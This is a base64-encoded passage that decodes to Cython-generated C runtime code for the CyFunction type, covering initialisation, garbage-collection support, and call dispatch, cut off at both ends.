ZWZsaXN0KVxuI2Vsc2VcbiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChjeWZ1bmMpICgoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX3dlYWtyZWZsaXN0KVxuI2VuZGlmXG5zdGF0aWMgUHlPYmplY3QgKl9fUHl4X0N5RnVuY3Rpb25fSW5pdChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlNZXRob2REZWYgKm1sLCBpbnQgZmxhZ3MsIFB5T2JqZWN0KiBxdWFsbmFtZSxcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpjbG9zdXJlLCBQeU9iamVjdCAqbW9kdWxlLCBQeU9iamVjdCogZ2xvYmFscywgUHlPYmplY3QqIGNvZGUpIHtcbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5Q0Z1bmN0aW9uT2JqZWN0ICpjZiA9IChQeUNGdW5jdGlvbk9iamVjdCopIG9wO1xuI2VuZGlmXG4gICAgaWYgKHVubGlrZWx5KG9wID09IE5VTEwpKVxuICAgICAgICByZXR1cm4gTlVMTDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgb3AtPmZ1bmMgPSBQeUNGdW5jdGlvbl9OZXdFeChtbCwgKFB5T2JqZWN0KilvcCwgbW9kdWxlKTtcbiAgICBpZiAodW5saWtlbHkoIW9wLT5mdW5jKSkgcmV0dXJuIE5VTEw7XG4jZW5kaWZcbiAgICBvcC0+ZmxhZ3MgPSBmbGFncztcbiAgICBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KG9wKSA9IE5VTEw7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBjZi0+bV9tbCA9IG1sO1xuICAgIGNmLT5tX3NlbGYgPSAoUHlPYmplY3QgKikgb3A7XG4jZW5kaWZcbiAgICBQeV9YSU5DUkVGKGNsb3N1cmUpO1xuICAgIG9wLT5mdW5jX2Nsb3N1cmUgPSBjbG9zdXJlO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfWElOQ1JFRihtb2R1bGUpO1xuICAgIGNmLT5tX21vZHVsZSA9IG1vZHVsZTtcbiNlbmRpZlxuICAgIG9wLT5mdW5jX2RpY3QgPSBOVUxMO1xuICAgIG9wLT5mdW5jX25hbWUgPSBOVUxMO1xuICAgIFB5X0lOQ1JFRihxdWFsbmFtZSk7XG4gICAgb3AtPmZ1bmNfcXVhbG5hbWUgPSBxdWFsbmFtZTtcbiAgICBvcC0+ZnVuY19kb2MgPSBOVUxMO1xuI2lmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDBCMSB8fCBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgb3AtPmZ1bmNfY2xhc3NvYmogPSBOVUxMO1xuI2Vsc2VcbiAgICAoKFB5Q01ldGhvZE9iamVjdCopb3ApLT5tbV9jbGFzcyA9IE5VTEw7XG4jZW5kaWZcbiAgICBvcC0+ZnVuY19nbG9iYWxzID0gZ2xvYmFscztcbiAgICBQeV9JTkNSRUYob3AtPmZ1bmNfZ2xvYmFscyk7XG4gICAgUHlfWElOQ1JFRihjb2RlKTtcbiAgICBvcC0+ZnVuY19jb2RlID0gY29kZTtcbiAgICBvcC0+ZGVmYXVsdHMgPSBOVUxMO1xuICAgIG9wLT5kZWZhdWx0c190dXBsZSA9IE5VTEw7XG4gICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IE5VTEw7XG4gICAgb3AtPmRlZmF1bHRzX2dldHRlciA9IE5VTEw7XG4gICAgb3AtPmZ1bmNfYW5ub3RhdGlvbnMgPSBOVUxMO1xuICAgIG9wLT5mdW5jX2lzX2Nvcm91dGluZSA9IE5VTEw7XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTExcbiAgICBzd2l0Y2ggKG1sLT5tbF9mbGFncyAmIChNRVRIX1ZBUkFSR1MgfCBNRVRIX0ZBU1RDQUxMIHwgTUVUSF9OT0FSR1MgfCBNRVRIX08gfCBNRVRIX0tFWVdPUkRTIHwgTUVUSF9NRVRIT0QpKSB7XG4gICAgY2FzZSBNRVRIX05PQVJHUzpcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9mdW5jX3ZlY3RvcmNhbGwob3ApID0gX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX05PQVJHUztcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX086XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9PO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIE1FVEhfTUVUSE9EIHwgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEU19NRVRIT0Q7XG4gICAgICAgIGJyZWFrO1xuICAgIGNhc2UgTUVUSF9GQVNUQ0FMTCB8IE1FVEhfS0VZV09SRFM6XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKG9wKSA9IF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9GQVNUQ0FMTF9LRVlXT1JEUztcbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTOlxuICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX2Z1bmNfdmVjdG9yY2FsbChvcCkgPSBOVUxMO1xuICAgICAgICBicmVhaztcbiAgICBkZWZhdWx0OlxuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfU3lzdGVtRXJyb3IsICJCYWQgY2FsbCBmbGFncyBmb3IgQ3lGdW5jdGlvbiIpO1xuICAgICAgICBQeV9ERUNSRUYob3ApO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4jZW5kaWZcbiAgICByZXR1cm4gKFB5T2JqZWN0ICopIG9wO1xufVxuc3RhdGljIGludFxuX19QeXhfQ3lGdW5jdGlvbl9jbGVhcihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICptKVxue1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfY2xvc3VyZSk7XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgIFB5X0NMRUFSKG0tPmZ1bmMpO1xuI2Vsc2VcbiAgICBQeV9DTEVBUigoKFB5Q0Z1bmN0aW9uT2JqZWN0KiltKS0+bV9tb2R1bGUpO1xuI2VuZGlmXG4gICAgUHlfQ0xFQVIobS0+ZnVuY19kaWN0KTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX25hbWUpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfcXVhbG5hbWUpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfZG9jKTtcbiAgICBQeV9DTEVBUihtLT5mdW5jX2dsb2JhbHMpO1xuICAgIFB5X0NMRUFSKG0tPmZ1bmNfY29kZSk7XG4jaWYgIUNZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiNpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjFcbiAgICBQeV9DTEVBUihfX1B5eF9DeUZ1bmN0aW9uX0dldENsYXNzT2JqKG0pKTtcbiNlbHNlXG4gICAge1xuICAgICAgICBQeU9iamVjdCAqY2xzID0gKFB5T2JqZWN0KikgKChQeUNNZXRob2RPYmplY3QgKikgKG0pKS0+bW1fY2xhc3M7XG4gICAgICAgICgoUHlDTWV0aG9kT2JqZWN0ICopIChtKSktPm1tX2NsYXNzID0gTlVMTDtcbiAgICAgICAgUHlfWERFQ1JFRihjbHMpO1xuICAgIH1cbiNlbmRpZlxuI2VuZGlmXG4gICAgUHlfQ0xFQVIobS0+ZGVmYXVsdHNfdHVwbGUpO1xuICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzX2t3ZGljdCk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19hbm5vdGF0aW9ucyk7XG4gICAgUHlfQ0xFQVIobS0+ZnVuY19pc19jb3JvdXRpbmUpO1xuICAgIFB5X0NMRUFSKG0tPmRlZmF1bHRzKTtcbiAgICByZXR1cm4gMDtcbn1cbnN0YXRpYyB2b2lkIF9fUHl4X19DeUZ1bmN0aW9uX2RlYWxsb2MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqbSlcbntcbiAgICBpZiAoX19QeXhfQ3lGdW5jdGlvbl93ZWFrcmVmbGlzdChtKSAhPSBOVUxMKVxuICAgICAgICBQeU9iamVjdF9DbGVhcldlYWtSZWZzKChQeU9iamVjdCAqKSBtKTtcbiAgICBfX1B5eF9DeUZ1bmN0aW9uX2NsZWFyKG0pO1xuICAgIF9fUHl4X1B5SGVhcFR5cGVPYmplY3RfR0NfRGVsKG0pO1xufVxuc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9kZWFsbG9jKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0pXG57XG4gICAgUHlPYmplY3RfR0NfVW5UcmFjayhtKTtcbiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9kZWFsbG9jKG0pO1xufVxuc3RhdGljIGludCBfX1B5eF9DeUZ1bmN0aW9uX3RyYXZlcnNlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0sIHZpc2l0cHJvYyB2aXNpdCwgdm9pZCAqYXJnKVxue1xuICAgIHtcbiAgICAgICAgaW50IGUgPSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoKFB5T2JqZWN0KiltLCAxLCB2aXNpdCwgYXJnKTtcbiAgICAgICAgaWYgKGUpIHJldHVybiBlO1xuICAgIH1cbiAgICBQeV9WSVNJVChtLT5mdW5jX2Nsb3N1cmUpO1xuI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUElcbiAgICBQeV9WSVNJVChtLT5mdW5jKTtcbiNlbHNlXG4gICAgUHlfVklTSVQoKChQeUNGdW5jdGlvbk9iamVjdCopbSktPm1fbW9kdWxlKTtcbiNlbmRpZlxuICAgIFB5X1ZJU0lUKG0tPmZ1bmNfZGljdCk7XG4gICAgX19QeXhfVklTSVRfQ09OU1QobS0+ZnVuY19uYW1lKTtcbiAgICBfX1B5eF9WSVNJVF9DT05TVChtLT5mdW5jX3F1YWxuYW1lKTtcbiAgICBQeV9WSVNJVChtLT5mdW5jX2RvYyk7XG4gICAgUHlfVklTSVQobS0+ZnVuY19nbG9iYWxzKTtcbiAgICBfX1B5eF9WSVNJVF9DT05TVChtLT5mdW5jX2NvZGUpO1xuI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlfVklTSVQoX19QeXhfQ3lGdW5jdGlvbl9HZXRDbGFzc09iaihtKSk7XG4jZW5kaWZcbiAgICBQeV9WSVNJVChtLT5kZWZhdWx0c190dXBsZSk7XG4gICAgUHlfVklTSVQobS0+ZGVmYXVsdHNfa3dkaWN0KTtcbiAgICBQeV9WSVNJVChtLT5mdW5jX2lzX2Nvcm91dGluZSk7XG4gICAgUHlfVklTSVQobS0+ZGVmYXVsdHMpO1xuICAgIHJldHVybiAwO1xufVxuc3RhdGljIFB5T2JqZWN0KlxuX19QeXhfQ3lGdW5jdGlvbl9yZXByKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKVxue1xuICAgIFB5T2JqZWN0ICpyZXByO1xuICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApO1xuICAgIHJlcHIgPSBQeVVuaWNvZGVfRnJvbUZvcm1hdCgiPGN5ZnVuY3Rpb24gJVUgYXQgJXA+IixcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3AtPmZ1bmNfcXVhbG5hbWUsICh2b2lkICopb3ApO1xuICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7XG4gICAgcmV0dXJuIHJlcHI7XG59XG5zdGF0aWMgUHlPYmplY3QgKiBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICpzZWxmLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpIHtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlPYmplY3QgKmYgPSAoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5mdW5jO1xuICAgIFB5Q0Z1bmN0aW9uIG1ldGg7XG4gICAgaW50IGZsYWdzO1xuICAgIG1ldGggPSBQeUNGdW5jdGlvbl9HZXRGdW5jdGlvbihmKTtcbiAgICBpZiAodW5saWtlbHkoIW1ldGgpKSByZXR1cm4gTlVMTDtcbiAgICBmbGFncyA9IFB5Q0Z1bmN0aW9uX0dldEZsYWdzKGYpO1xuICAgIGlmICh1bmxpa2VseShmbGFncyA8IDApKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgUHlDRnVuY3Rpb25PYmplY3QqIGYgPSAoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmM7XG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9IGYtPm1fbWwtPm1sX21ldGg7XG4gICAgaW50IGZsYWdzID0gZi0+bV9tbC0+bWxfZmxhZ3M7XG4jZW5kaWZcbiAgICBQeV9zc2l6ZV90IHNpemU7XG4gICAgc3dpdGNoIChmbGFncyAmIChNRVRIX1ZBUkFSR1MgfCBNRVRIX0tFWVdPUkRTIHwgTUVUSF9OT0FSR1MgfCBNRVRIX08pKSB7XG4gICAgY2FzZSBNRVRIX1ZBUkFSR1M6XG4gICAgICAgIGlmIChsaWtlbHkoa3cgPT0gTlVMTCB8fCBQeURpY3RfU2l6ZShrdykgPT0gMCkpXG4gICAgICAgICAgICByZXR1cm4gKCptZXRoKShzZWxmLCBhcmcpO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIE1FVEhfVkFSQVJHUyB8IE1FVEhfS0VZV09SRFM6XG4gICAgICAgIHJldHVybiAoKihQeUNGdW5jdGlvbldpdGhLZXl3b3Jkcykodm9pZCgqKSh2b2lkKSltZXRoKShzZWxmLCBhcmcsIGt3KTtcbiAgICBjYXNlIE1FVEhfTk9BUkdTOlxuICAgICAgICBpZiAobGlrZWx5KGt3ID09IE5VTEwgfHwgUHlEaWN0X1NpemUoa3cpID09IDApKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgICAgIHNpemUgPSBQeVR1cGxlX0dFVF9TSVpFKGFyZyk7XG4jZWxzZVxuICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfU2l6ZShhcmcpO1xuICAgICAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgPCAwKSkgcmV0dXJuIE5VTEw7XG4jZW5kaWZcbiAgICAgICAgICAgIGlmIChsaWtlbHkoc2l6ZSA9PSAwKSlcbiAgICAgICAgICAgICAgICByZXR1cm4gKCptZXRoKShzZWxmLCBOVUxMKTtcbiAgICAgICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoXG4gICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsXG4gICAgICAgICAgICAgICAgInRha2VzIG5vIGFyZ3VtZW50cyIsIHNpemUpO1xuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIH1cbiAgICAgICAgYnJlYWs7XG4gICAgY2FzZSBNRVRIX086XG4gICAgICAgIGlmIChsaWtlbHkoa3cgPT0gTlVMTCB8fCBQeURpY3RfU2l6ZShrdykgPT0gMCkpIHtcbiNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICAgICAgc2l6ZSA9IFB5VHVwbGVfR0VUX1NJWkUoYXJnKTtcbiNlbHNlXG4gICAgICAgICAgICBzaXplID0gUHlUdXBsZV9TaXplKGFyZyk7XG4gICAgICAgICAgICBpZiAodW5saWtlbHkoc2l6ZSA8IDApKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgICAgICAgICAgaWYgKGxpa2VseShzaXplID09IDEpKSB7XG4gICAgICAgICAgICAgICAgUHlPYmplY3QgKnJlc3VsdCwgKmFyZzA7XG4gICAgICAgICAgICAgICAgI2lmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgIUNZVEhPTl9BVk9JRF9CT1JST1dFRF9SRUZTXG4gICAgICAgICAgICAgICAgYXJnMCA9IFB5VHVwbGVfR0VUX0lURU0oYXJnLCAwKTtcbiAgICAgICAgICAgICAgICAjZWxzZVxuICAgICAgICAgICAgICAgIGFyZzAgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0oYXJnLCAwKTsgaWYgKHVubGlrZWx5KCFhcmcwKSkgcmV0dXJuIE5VTEw7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgcmVzdWx0ID0gKCptZXRoKShzZWxmLCBhcmcwKTtcbiAgICAgICAgICAgICAgICAjaWYgIShDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGUylcbiAgICAgICAgICAgICAgICBQeV9ERUNSRUYoYXJnMCk7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgcmV0dXJuIHJlc3VsdDtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoXG4gICAgICAgICAgICAgICAgKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWZ1bmMsXG4gICAgICAgICAgICAgICAgInRha2VzIGV4YWN0bHkgb25lIGFyZ3VtZW50Iiwgc2l6ZSk7XG4gICAgICAgICAgICByZXR1cm4gTlVMTDtcbiAgICAgICAgfVxuICAgICAgICBicmVhaztcbiAgICBkZWZhdWx0OlxuICAgICAgICBQeUVycl9TZXRTdHJpbmcoUHlFeGNfU3lzdGVtRXJyb3IsICJCYWQgY2FsbCBmbGFncyBmb3IgQ3lGdW5jdGlvbiIpO1xuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKFxuICAgICAgICAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCopZnVuYywgInRha2VzIG5vIGtleXdvcmQgYXJndW1lbnRzIik7XG4gICAgcmV0dXJuIE5VTEw7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9DYWxsKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqYXJnLCBQeU9iamVjdCAqa3cpIHtcbiAgICBQeU9iamVjdCAqc2VsZiwgKnJlc3VsdDtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgc2VsZiA9IFB5Q0Z1bmN0aW9uX0dldFNlbGYoKChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0KilmdW5jKS0+ZnVuYyk7XG4gICAgaWYgKHVubGlrZWx5KCFzZWxmKSAmJiBQeUVycl9PY2N1cnJlZCgpKSByZXR1cm4gTlVMTDtcbiNlbHNlXG4gICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5tX3NlbGY7XG4jZW5kaWZcbiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX0NhbGxNZXRob2QoZnVuYywgc2VsZiwgYXJnLCBrdyk7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9DYWxsQXNNZXRob2QoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmdzLCBQeU9iamVjdCAqa3cpIHtcbiAgICBQeU9iamVjdCAqcmVzdWx0O1xuICAgIF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmN5ZnVuYyA9IChfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICopIGZ1bmM7XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKVxuICAgICBfX3B5eF92ZWN0b3JjYWxsZnVuYyB2YyA9IF9fUHl4X0N5RnVuY3Rpb25fZnVuY192ZWN0b3JjYWxsKGN5ZnVuYyk7XG4gICAgaWYgKHZjKSB7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRVxuICAgICAgICByZXR1cm4gX19QeXhfUHlWZWN0b3JjYWxsX0Zhc3RDYWxsRGljdChmdW5jLCB2YywgJlB5VHVwbGVfR0VUX0lURU0oYXJncywgMCksIChzaXplX3QpUHlUdXBsZV9HRVRfU0laRShhcmdzKSwga3cpO1xuI2Vsc2VcbiAgICAgICAgKHZvaWQpICZfX1B5eF9QeVZlY3RvcmNhbGxfRmFzdENhbGxEaWN0O1xuICAgICAgICByZXR1cm4gUHlWZWN0b3JjYWxsX0NhbGwoZnVuYywgYXJncywga3cpO1xuI2VuZGlmXG4gICAgfVxuI2VuZGlmXG4gICAgaWYgKChjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MpICYmICEoY3lmdW5jLT5mbGFncyAmIF9fUHl4X0NZRlVOQ1RJT05fU1RBVElDTUVUSE9EKSkge1xuICAgICAgICBQeV9zc2l6ZV90IGFyZ2M7XG4gICAgICAgIFB5T2JqZWN0ICpuZXdfYXJncztcbiAgICAgICAgUHlPYmplY3QgKnNlbGY7XG4jaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgICAgICAgYXJnYyA9IFB5VHVwbGVfR0VUX1NJWkUoYXJncyk7XG4jZWxzZVxuICAgICAgICBhcmdjID0gUHlUdXBsZV9TaXplKGFyZ3MpO1xuICAgICAgICBpZiAodW5saWtlbHkoYXJnYyA8IDApKSByZXR1cm4gTlVMTDtcbiNlbmRpZlxuICAgICAgICBuZXdfYXJncyA9IFB5VHVwbGVfR2V0U2xpY2UoYXJncywgMSwgYXJnYyk7XG4gICAgICAgIGlmICh1bmxpa2VseSghbmV3X2FyZ3MpKVxuICAgICAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgICAgIHNlbGYgPSBQeVR1cGxlX0dldEl0ZW0oYXJncywgMCk7XG4gICAgICAgIGlmICh1bmxpa2VseSghc2VsZikpIHtcbiAgICAgICAgICAgIFB5X0RFQ1JFRihuZXdfYXJncyk7XG4gICAgICAgICAgICBQeUVycl9Gb3JtYXQoUHlFeGNfVHlwZUVycm9yLFxuICAgICAgICAgICAgICAgICAgICAgICAgICJ1bmJvdW5kIG1ldGhvZCAlLjIwMFMoKSBuZWVkcyBhbiBhcmd1bWVudCIsXG4gICAgICAgICAgICAgICAgICAgICAgICAgY3lmdW5jLT5mdW5jX3F1YWxuYW1lKTtcbiAgICAgICAgICAgIHJldHVybiBOVUxMO1xuICAgICAgICB9XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbE1ldGhvZChmdW5jLCBzZWxmLCBuZXdfYXJncywga3cpO1xuICAgICAgICBQeV9ERUNSRUYobmV3X2FyZ3MpO1xuICAgIH0gZWxzZSB7XG4gICAgICAgIHJlc3VsdCA9IF9fUHl4X0N5RnVuY3Rpb25fQ2FsbChmdW5jLCBhcmdzLCBrdyk7XG4gICAgfVxuICAgIHJldHVybiByZXN1bHQ7XG59XG4jaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwgJiYgKENZVEhPTl9WRUNUT1JDQUxMIHx8IENZVEhPTl9CQUNLUE9SVF9WRUNUT1JDQUxMKVxuc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9DaGVja0FyZ3MoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqY3lmdW5jLCBQeV9zc2l6ZV90IG5hcmdzLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBpbnQgcmV0ID0gMDtcbiAgICBpZiAoKGN5ZnVuYy0+ZmxhZ3MgJiBfX1B5eF9DWUZVTkNUSU9OX0NDTEFTUykgJiYgIShjeWZ1bmMtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9TVEFUSUNNRVRIT0QpKSB7XG4gICAgICAgIGlmICh1bmxpa2VseShuYXJncyA8IDEpKSB7XG4gICAgICAgICAgICBfX1B5eF9DeUZ1bmN0aW9uX3JhaXNlX3R5cGVfZXJyb3IoXG4gICAgICAgICAgICAgICAgY3lmdW5jLCAibmVlZHMgYW4gYXJndW1lbnQiKTtcbiAgICAgICAgICAgIHJldHVybiAtMTtcbiAgICAgICAgfVxuICAgICAgICByZXQgPSAxO1xuICAgIH1cbiAgICBpZiAodW5saWtlbHkoa3duYW1lcykgJiYgdW5saWtlbHkoX19QeXhfUHlUdXBsZV9HRVRfU0laRShrd25hbWVzKSkpIHtcbiAgICAgICAgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKFxuICAgICAgICAgICAgY3lmdW5jLCAidGFrZXMgbm8ga2V5d29yZCBhcmd1bWVudHMiKTtcbiAgICAgICAgcmV0dXJuIC0xO1xuICAgIH1cbiAgICByZXR1cm4gcmV0O1xufVxuc3RhdGljIFB5T2JqZWN0ICogX19QeXhfQ3lGdW5jdGlvbl9WZWN0b3JjYWxsX05PQVJHUyhQeU9iamVjdCAqZnVuYywgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmLCBQeU9iamVjdCAqa3duYW1lcylcbntcbiAgICBfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpjeWZ1bmMgPSAoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKWZ1bmM7XG4jaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTExcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gKFB5X3NzaXplX3QpbmFyZ3NmO1xuI2Vsc2VcbiAgICBQeV9zc2l6ZV90IG5hcmdzID0gUHlWZWN0b3JjYWxsX05BUkdTKG5hcmdzZik7XG4jZW5kaWZcbiAgICBQeU9iamVjdCAqc2VsZjtcbiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJXG4gICAgUHlDRnVuY3Rpb24gbWV0aCA9IFB5Q0Z1bmN0aW9uX0dldEZ1bmN0aW9uKGN5ZnVuYy0+ZnVuYyk7XG4gICAgaWYgKHVubGlrZWx5KCFtZXRoKSkgcmV0dXJuIE5VTEw7XG4jZWxzZVxuICAgIFB5Q0Z1bmN0aW9uIG1ldGggPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KiljeWZ1bmMpLT5tX21sLT5tbF9tZXRoO1xuI2VuZGlmXG4gICAgc3dpdGNoIChfX1B5eF9DeUZ1bmN0aW9uX1ZlY3RvcmNhbGxfQ2hlY2tBcmdzKGN5ZnVuYywgbmFyZ3MsIGt3bmFtZXMpKSB7XG4gICAgY2FzZSAxOlxuICAgICAgICBzZWxmID0gYXJnc1swXTtcbiAgICAgICAgYXJncyArPSAxO1xuICAgICAgICBuYXJncyAtPSAxO1xuICAgICAgICBicmVhaztcbiAgICBjYXNlIDA6XG4jaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSVxuICAgICAgICBzZWxmID0gUHlDRnVuY3Rpb25fR2V0U2VsZigoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPmZ1bmMpO1xuICAgICAgICBpZiAodW5saWtlbHkoIXNlbGYpICYmIFB5RXJyX09jY3VycmVkKCkpIHJldHVybiBOVUxMO1xuI2Vsc2VcbiAgICAgICAgc2VsZiA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWN5ZnVuYyktPm1fc2VsZjtcbiNlbmRpZlxuICAgICAgICBicmVhaztcbiAgICBkZWZhdWx0OlxuICAgICAgICByZXR1cm4gTlVMTDtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KG5hcmdzICE9IDApKSB7XG4gICAgICAgIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoXG4gICAgICAgICAgICBjeWZ1bmMsICJ0YWtlcyBubyBhcmd1bWVudHMiLCBuYXJncyk7XG4gICAgICAgIHJldHVybiBOVUxMO1xuICAgIH1cbiAgICByZXR1cm4gbWV0aChzZWxmLCBOVUxMKTtcbn1cbnN0YXRpYyBQeU9iamVjdCAqIF9fUHl4X0N5RnVuY3Rpb25fVmVjdG9yY2FsbF9PKFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdC